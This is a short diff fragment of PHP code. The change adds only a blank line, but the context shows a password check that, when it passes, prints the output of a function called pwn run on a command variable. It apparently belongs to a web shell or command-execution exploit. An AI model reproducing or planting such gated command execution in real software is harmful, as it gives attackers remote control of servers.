@@ -247,6 +247,7 @@ if($password === $get_password)
 	{
 		echo trim(pwn($cmd));
 	}
+	
   }
   else
   {
